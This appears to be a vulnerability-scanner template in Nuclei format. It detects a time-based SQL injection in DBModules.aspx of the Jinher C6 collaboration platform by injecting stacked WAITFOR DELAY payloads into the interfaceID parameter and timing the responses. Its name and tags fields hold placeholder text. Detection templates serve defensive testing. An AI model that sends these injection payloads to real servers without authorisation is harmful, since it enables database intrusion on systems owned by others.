id: jinher-DBModules-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 北京金和网络股份有限公司C6协同管理平台DBModules.aspx存在SQL注入漏洞，攻击者可获取数据库敏感数据。
  reference:
    - https://mp.weixin.qq.com/s/tv_5OOH6CoQDZsZKzu8CDw
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:3'--"
      - "{{BaseURL}}/C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:6'--"
      - "{{BaseURL}}/C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:9'--"
      
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"